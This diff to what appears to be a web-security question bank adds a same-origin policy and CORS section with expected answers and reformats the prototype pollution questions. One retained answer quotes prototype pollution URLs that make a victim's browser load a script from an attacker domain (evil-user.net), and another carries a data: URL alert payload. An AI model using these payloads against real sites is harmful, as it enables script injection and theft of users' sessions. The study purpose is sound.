@@ -19,19 +19,46 @@
 10. Explain what a Time-of-Check to Time-of-Use (TOCTOU) race condition is and provide a strategy for mitigating such vulnerabilities.
 
 **Prototype Pollution**:
-1. What is prototype pollution?
-2. How do prototype pollution vulnerabilities arise? 
-3. What is the special meaning of the \_\_proto\_\_ property?
-4. Is it possible to pollute any prototype object?
+1. What is prototype pollution?  
+2. How do prototype pollution vulnerabilities arise?  
+3. What is the special meaning of the \_\_proto\_\_ property?  
+4. Is it possible to pollute any prototype object?  
 5. Exploitation of prototype pollution requires the what key components?  
-6. What are prototype pollution sources?
-7. Explain prototype pollution via the URL works?
+6. What are prototype pollution sources?  
+7. Explain prototype pollution via the URL works?  
 8. What is the role of the JSON.parse() method in the context of prototype pollution via JSON input?  
-9. How can an attacker exploit the JSON.parse() method to achieve prototype pollution?
-10. Illustrate with an example how parsing malicious JSON leads to prototype pollution.
-11. Describe prototype pollution sinks?
-12. Describe prototype pollution gadgets?
-13. Give an example of a prototype pollution gadget.
+9. How can an attacker exploit the JSON.parse() method to achieve prototype pollution?  
+10. Illustrate with an example how parsing malicious JSON leads to prototype pollution.  
+11. Describe prototype pollution sinks?  
+12. Describe prototype pollution gadgets?  
+13. Give an example of a prototype pollution gadget.  
+
+**Cross-Origin Resource Sharing (CORS) and (SOP)**:
+1. What is CORS (cross-origin resource sharing)?  
+2. What is the same-origin policy?  
+3. In SOP what does an origin consist of and give an example.  
+4. Consider the following URL: `http://normal-website.com/example/example.html`  
+5. Why is the same-origin policy necessary?  
+6. How is the same-origin policy implemented?  
+7. Explain why the Same-Origin Policy does not allow JavaScript to read and manipulate data from images loaded from a different origin. Discuss the implications of this policy on web security.  
+8. Consider a web page that includes an external script using a script tag like `<script src="http://external.com/script.js"></script>`. Discuss whether the JavaScript on the original page can directly access or manipulate the contents of the external script and explain why.  
+9. Describe how the Same-Origin Policy affects the use of images in a `<canvas>` element when these images are loaded from a different origin. Include an explanation of what happens if proper CORS headers are not set and the concept of a "tainted" canvas.  
+10. A web developer wishes to manipulate the pixel data of an image hosted on a different domain. Given the restrictions of the Same-Origin Policy, describe a secure method that the developer can use to achieve this goal.  
+11. Discuss the role of browser enforcement in the Same-Origin Policy. Elaborate on the potential security risks and implications if this policy were not enforced by web browsers.  
+12. What are the various exceptions to the same-origin policy?  
+13. Is the same-origin policy is more relaxed when dealing with cookies and if so, how can you mitigate this risk?  
+14. Is it possible to relax same-origin policy without CORS, if so how?  
+15. Explain why CORS is not a solution for CSRF?  
+16. What is a common intended usecase for a website to implement a CORS Policy?  
+17. What are the key headers used in CORS?  
+18. What is the Access-Control-Allow-Origin response header?  
+19. What is the Access-Control-Allow-Credentials response header?  
+20. What is the spec for ACAO:* and ACAC: true and do modern browsers allow a cross-domain server response in this form?  
+21. Some web servers dynamically create Access-Control-Allow-Origin headers based upon the client-specified origin, what is the issue with this?  
+22. Explain the purpose and usage of the Access-Control-Request-Method header in the context of CORS, particularly in how it functions during a preflight request?  
+23. Consider a scenario where a subdomain (e.g., subdomain.vuln-site.com) of a website (vuln-site.com) is vulnerable to an XSS attack. The main site has a CORS policy with Access-Control-Allow-Origin set to the subdomain and Access-Control-Allow-Credentials: true. Assuming that the cookies on the subdomain are set with the HttpOnly flag, if an XSS attack on the subdomain triggers an AJAX request to vuln-site.com to access sensitive information that relies on the subdomain's cookies, will the HttpOnly flag prevent the transmission of these cookies in the request?  
+24. How to prevent CORS-based attacks?  
+
 
 ### Web Security
 
@@ -136,3 +163,123 @@ In this case, objectFromJson will have a property \_\_proto\_\_ with the value `
 **Expected Answer**: A JavaScript library uses a configuration object to set various options. It includes a line like let transport_url = config.transport_url || defaults.transport_url; to determine a URL for script loading. If transport_url isn't set by the developer, the library defaults to a predefined option.
 However, this approach can be exploited if an attacker is able to pollute the global Object.prototype with their own transport_url property. This polluted property would then be inherited by the config object, causing the library to load a script from an attacker-controlled domain.
 Manipulating the transport_url via a query parameter in the website URL. For example, by directing a victim to https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net, the attacker can make the victim's browser load a malicious script. Alternatively, an XSS payload can be embedded directly using a data: URL, like https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//, with the trailing // serving to comment out any suffixes added by the library.
+
+##### Cross-Origin Resource Sharing (CORS)
+
+1. What is CORS (cross-origin resource sharing)?  
+**Expected Answer**: Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). CORS is about controlling access to resources from different domains, focusing on a "read" access model.
+
+1. What is the same-origin policy?  
+**Expected Answer**: The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other. The same-origin policy restricts scripts on one origin from accessing data from another origin. 
+
+1. In SOP what does an origin consist of and give an example.    
+**Expected Answer**: An origin consists of a URI scheme, domain and port number. For example, consider the following URL: http://normal-website.com/example/example.html where `http` is the scheme, the domain `normal-website`, and the port number `80`.
+
+1. Consider the following URL: `http://normal-website.com/example/example.html`
+
+   | URL accessed | Access permitted? |
+   | ----------- | ----------- |
+   | http://normal-website.com/example/      | ?       |
+   | http://normal-website.com/example2/   | ?        |  
+   | https://normal-website.com/example/   | ?        |  
+   | http://en.normal-website.com/example/   | ?        |  
+   | http://www.normal-website.com/example/	   | ?        |  
+   | http://normal-website.com:8080/example/   | ?        |  
+
+   **Expected Answer**: 
+   | URL accessed | Access permitted? |
+   | ----------- | ----------- |
+   | http://normal-website.com/example/      | Yes: same scheme, domain, and port      |
+   | http://normal-website.com/example2/   | Yes: same scheme, domain, and port        |  
+   | https://normal-website.com/example/   | No: different scheme and port        |  
+   | http://en.normal-website.com/example/   | No: different domain        |  
+   | http://www.normal-website.com/example/	   | No: different domain        |  
+   | http://normal-website.com:8080/example/   | No: different port*        |  
+
+       * Internet explorer will allow this access because IE does not account for the port number in same-origin policy
+
+
+1. Why is the same-origin policy necessary?  
+**Expected Answer**: When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request. This means that the response will be generated within the user's session, and include any relevant data that is specific to the user. Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc.
+
+1. How is the same-origin policy implemented?  
+**Expected Answer**: The same-origin policy generally controls the access that JavaScript code has to content that is loaded cross-domain. Cross-origin loading of page resources is generally permitted. For example, the SOP allows embedding of images via the `<img>` tag, media via the `<video>`, `<audio>` tag,  stylesheets `<link>` tag, and JavaScript includes with the `<script>` tag. However, while these external resources can be loaded by the page, any JavaScript on the page won't be able to read the contents of these resources.
+
+1. Explain why the Same-Origin Policy does not allow JavaScript to read and manipulate data from images loaded from a different origin. Discuss the implications of this policy on web security.  
+**Expected Answer**: The Same-Origin Policy does not allow JavaScript to read or manipulate data from images loaded from a different origin. This policy ensures that scripts run in the context of one web page cannot access data from another web page unless both pages have the same origin. This is crucial for web security as it prevents potential data theft and privacy breaches.
+
+1. Consider a web page that includes an external script using a script tag like `<script src="http://external.com/script.js"></script>`. Discuss whether the JavaScript on the original page can directly access or manipulate the contents of the external script and explain why.  
+**Expected Answer**: The JavaScript on the original page cannot directly access or manipulate the contents of the external script. This restriction is due to the Same-Origin Policy, which prevents scripts from one origin from accessing data from a different origin to protect against Cross-Site Scripting (XSS) attacks and data theft.
+
+1. Describe how the Same-Origin Policy affects the use of images in a `<canvas>` element when these images are loaded from a different origin. Include an explanation of what happens if proper CORS headers are not set and the concept of a "tainted" canvas.  
+**Expected Answer**: Under the Same-Origin Policy, when images from a different origin are used in a `<canvas>` element, the canvas is "tainted." This means that JavaScript cannot read the data from this canvas, such as pixel values. This restriction prevents the canvas from being used as a channel to leak information from cross-origin images. If proper CORS headers are set, this restriction can be lifted, allowing JavaScript to manipulate the image data within the canvas.
+
+1. A web developer wishes to manipulate the pixel data of an image hosted on a different domain. Given the restrictions of the Same-Origin Policy, describe a secure method that the developer can use to achieve this goal.  
+**Expected Answer**: To manipulate pixel data of an image hosted on a different domain, the developer could use a server-side proxy. The proxy fetches the image from the external domain and then serves it to the frontend as if it originated from the same domain, thus complying with the Same-Origin Policy.
+
+1. Discuss the role of browser enforcement in the Same-Origin Policy. Elaborate on the potential security risks and implications if this policy were not enforced by web browsers.  
+**Expected Answer**: Browsers enforce CORS policies by only allowing front-end JavaScript code to access responses from cross-origin requests if the server's CORS headers permit it. Without this policy, scripts could freely access and manipulate data from any source, leading to significant security risks such as data theft, session hijacking, and other forms of web-based attacks. This enforcement does not extend to the prevention of requests being sent; it only governs the visibility of responses to these requests in the client-side JavaScript.
+
+1. What are the various exceptions to the same-origin policy?  
+**Expected Answer**: 
+   * Some objects are writable but not readable cross-domain, such as the `location` object or the `location.href` property from iframes or new windows.
+   * Some objects are readable but not writable cross-domain, such as the `length` property of the `window` object (which stores the number of frames being used on the page) and the `closed` property.
+   * The `replace` function can generally be called cross-domain on the `location` object.
+   * You can call certain functions cross-domain. For example, you can call the functions `close`, `blur` and `focus` on a new window. The `postMessage` function can also be called on iframes and new windows in order to send messages from one domain to another.
+
+1. Is the same-origin policy is more relaxed when dealing with cookies and if so, how can you mitigate this risk?  
+**Expected Answer**: Due to legacy requirements, the same-origin policy is more relaxed when dealing with cookies, so they are often accessible from all subdomains of a site even though each subdomain is technically a different origin. You can partially mitigate this risk using the HttpOnly cookie flag.
+
+1. Is it possible to relax same-origin policy without CORS, if so how?  
+**Expected Answer**: It's possible to relax same-origin policy using `document.domain`. This special property allows you to relax SOP for a specific domain, but only if it's part of your FQDN (fully qualified domain name). For example, you might have a domain `marketing.example.com` and you would like to read the contents of that domain on `example.com`. To do so, both domains need to set `document.domain` to `example.com`. Then SOP will allow access between the two domains despite their different origins. In the past it was possible to set `document.domain` to a TLD such as `com`, which allowed access between any domains on the same TLD, but now modern browsers prevent this.
+
+1. Explain why CORS is not a solution for CSRF?  
+**Expected Answer**: CORS is about controlling access to resources from different domains, focusing on a "read" access model. CSRF, however, exploits "write" operations. It doesn’t need to read data from a cross-origin; instead, it induces a victim’s browser to send a state-changing request to a target site. CORS headers control which origins can fetch resources or read responses from a different origin. They don't control or restrict the sending of requests to different origins. CSRF exploits the fact that credentials, like cookies, are automatically included in requests. CORS does not change this behavior.
+
+1. What is a common intended usecase for a website to implement a CORS Policy?  
+**Expected Answer**: Many modern websites use CORS to allow access from subdomains and trusted third parties.
+
+1. What are the key headers used in CORS?  
+**Expected Answer**: 
+
+   * Access-Control-Allow-Origin
+   * Access-Control-Allow-Credentials
+   * Access-Control-Request-Method
+   * Access-Control-Request-Headers
+
+1. What is the Access-Control-Allow-Origin response header?  
+**Expected Answer**: The Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match. The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *.
+
+1. What is the Access-Control-Allow-Credentials response header?  
+**Expected Answer**: The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true
+
+1. What is the spec for ACAO:* and ACAC: true and do modern browsers allow a cross-domain server response in this form?  
+**Expected Answer**: The spec doesn't allow both a wildcard for ACAO and ACAC to be true. This is also enforced by most modern browsers, and will throw an error.
+
+1. Some web servers dynamically create Access-Control-Allow-Origin headers based upon the client-specified origin, what is the issue with this?  
+**Expected Answer**: If the ACAO response header is reflecting what the Origin header is from the request, then this means that absolutely any domain can access resources from the vulnerable domain. Combinded with ACAC: true it would allow any attacker to to pull sensitive information if the response contains any sensitive information such as an API key or CSRF token.
+
+1. Explain the purpose and usage of the Access-Control-Request-Method header in the context of CORS, particularly in how it functions during a preflight request?  
+**Expected Answer**: Under certain circumstances, when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request. This is called the pre-flight check. The server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed.
+
+   ```
+   OPTIONS /data HTTP/1.1
+   Origin: https://normal-website.com
+   Access-Control-Request-Method: PUT
+
+   HTTP/1.1 204 No Content
+   Access-Control-Allow-Origin: https://normal-website.com
+   Access-Control-Allow-Methods: PUT, POST, OPTIONS
+   Access-Control-Allow-Credentials: true
+   Access-Control-Max-Age: 240
+   ```
+   This response sets out the allowed methods (PUT, POST and OPTIONS). In this particular case the cross-domain server also allows the sending of credentials, and the Access-Control-Max-Age header defines a maximum timeframe for caching the pre-flight response for reuse. If the request methods and headers are permitted (as they are in this example) then the browser processes the cross-origin request in the usual way.
+
+1. Consider a scenario where a subdomain (e.g., subdomain.vuln-site.com) of a website (vuln-site.com) is vulnerable to an XSS attack. The main site has a CORS policy with Access-Control-Allow-Origin set to the subdomain and Access-Control-Allow-Credentials: true. Assuming that the cookies on the subdomain are set with the HttpOnly flag, if an XSS attack on the subdomain triggers an AJAX request to vuln-site.com to access sensitive information that relies on the subdomain's cookies, will the HttpOnly flag prevent the transmission of these cookies in the request?  
+**Expected Answer**: No, the HttpOnly flag will not prevent the transmission of cookies in this scenario. While the HttpOnly flag makes the cookies inaccessible to JavaScript running on the client side, it does not prevent the browser from automatically including these cookies in HTTP requests to the domain which set them. Therefore, when the XSS exploit triggers an AJAX request to vuln-site.com, the browser will still include all relevant cookies, including those marked as HttpOnly, in the request headers. This behavior occurs due to the browser's adherence to the CORS policy set by vuln-site.com, which includes Access-Control-Allow-Credentials: true, allowing credentials (such as cookies) to be included in cross-origin requests.
+
+1. How to prevent CORS-based attacks?  
+**Expected Answer**: 
+
+   * Proper configuration of cross-origin requests: If a web resource contains sensitive information, the origin should be properly specified in the Access-Control-Allow-Origin header.
+   * Only allow trusted sites: Origins specified in the Access-Control-Allow-Origin header should only be sites that are trusted.
